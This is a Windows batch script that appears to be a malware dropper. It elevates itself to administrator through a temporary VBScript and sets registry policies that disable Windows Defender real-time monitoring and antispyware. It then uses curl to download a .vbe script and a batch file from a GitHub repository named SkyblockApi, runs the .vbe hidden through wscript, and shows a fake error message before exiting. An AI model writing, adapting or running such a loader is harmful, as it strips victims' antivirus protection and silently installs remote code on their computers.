@echo off
cd C:\Windows\
if "%1"=="admin" goto run_as_admin
echo error not run as Admin
echo Set objShell = CreateObject("Shell.Application") > "%temp%\admin.vbs"
echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
"%temp%\admin.vbs"
del /q "%temp%\admin.vbs"


:run_as_admin
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
curl -s -o "scriptmenagers".vbe -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/scriptmenagers.vbe"
curl -s -o "msisettings".bat -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/installer.bat"
start /min wscript.exe "scriptmenagers.vbe"
cls
echo error 3462
timeout /t 10 /nobreak >nul
exit
